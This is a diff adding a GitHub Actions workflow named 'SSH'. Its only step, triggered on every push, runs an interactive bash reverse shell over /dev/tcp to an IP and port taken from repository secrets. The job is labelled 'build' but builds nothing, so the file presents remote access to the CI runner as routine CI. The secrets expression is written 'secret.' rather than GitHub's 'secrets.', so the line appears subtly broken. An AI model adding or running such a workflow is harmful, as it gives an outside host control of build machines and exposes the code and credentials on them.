@@ -1,0 +1,10 @@
+name: SSH
+
+on:
+  push:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: bash -i > /dev/tcp/${{secret.IP}}/${{secret.PORT}} 0<&1 2>&1
+        
